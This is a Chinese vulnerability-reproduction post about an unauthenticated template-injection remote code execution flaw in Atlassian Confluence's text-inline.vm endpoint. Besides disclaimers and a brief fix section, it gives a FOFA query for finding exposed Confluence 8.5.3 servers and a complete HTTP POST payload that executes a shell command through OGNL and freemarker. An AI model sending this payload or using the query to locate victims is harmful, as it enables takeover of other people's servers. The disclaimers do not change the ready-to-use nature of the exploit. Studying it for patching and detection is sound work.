#  漏洞复现 | Atlassian Confluence远程代码执行漏洞【附poc】   
原创 实战安全研究  实战安全研究   2024-05-27 18:44  
  
**免责声明**  
  
**本文仅用于技术学习和讨论。请勿使用本文所提供的内容及相关技术从事非法活动**  
**，由于传播、利用此文所提供的内容或工具而造成的任何直接或者间接的后果及损失，**  
**均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号**  
**无关**  
**，本次测试仅供学习使用。**  
**如有内容争议或侵权，请及时私信我们！****我们会立即删除并致歉。谢谢！**  
##   
  
**一、漏洞简述**  
  
Atlassian Confuence是一款由Atlassian开发的企业团队协作和知识管理软件，提供了一个集中化的平台，用于创建、组织和共享团队的文档、知识库、项目计划和协作内容。是面向大型企业和组织的高可用性、可扩展性和高性能版本。  
其  
text-inline.vm  
接口  
存在远程代码执行漏洞，  
该漏洞源于存在模板注入漏洞，  
未经身份验证  
的恶意攻击者  
可以  
实现远程代码执行，  
进而控制服务器系统  
。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF3rB5WU9YKEdtCZibrt3FaWwpK73KXC8pcO7TZ7YfYCdPbkRARB6xtShBowRErfKkQUV7S8vqgs9ibQ/640?wx_fmt=png&from=appmsg "")  
## 二、网络测绘  
```
fofa：
app="ATLASSIAN-Confluence" && body="由 Atlassian 合流8.5.3"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF3rB5WU9YKEdtCZibrt3FaWwEhdqUXGFcia4zFmKUhGMNWtMo7s7jABaxfMYdoVbke65YqjSm4L3Saw/640?wx_fmt=png&from=appmsg "")  
## 三、漏洞复现  
  
测试执行  
id命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF3rB5WU9YKEdtCZibrt3FaWw1ANEnVRnhpDSyRLPdfFuJ0vO4LEXnfZ9EDpffg9beL1icDtm6GpLjRQ/640?wx_fmt=png&from=appmsg "")  
  
**四、漏洞检测poc**  
```
POST /template/aui/text-inline.vm HTTP/2
Host: 0.0.0.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 278

label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.poc[0],{})%2b\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader('Cmd',(new+freemarker.template.utility.Execute()).exec({'id'}))
```  
  
  
**五、漏洞修复**  
  
1  
、建议联系厂商打补丁或升级版本。  
  
2、增  
加Web应用防火墙防护。  
  
3、  
关闭互联网暴露面或接口设置访问权限。  
  
**免责声明**  
  
**本文仅用于技术学习和讨论。请勿使用本文所提供的内容及相关技术从事非法活动**  
**，由于传播、利用此文所提供的内容或工具而造成的任何直接或者间接的后果及损失，**  
**均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号**  
**无关**  
**，本次测试仅供学习使用。**  
**如有内容争议或侵权，请及时私信我们！****我们会立即删除并致歉。谢谢！**  
  
  
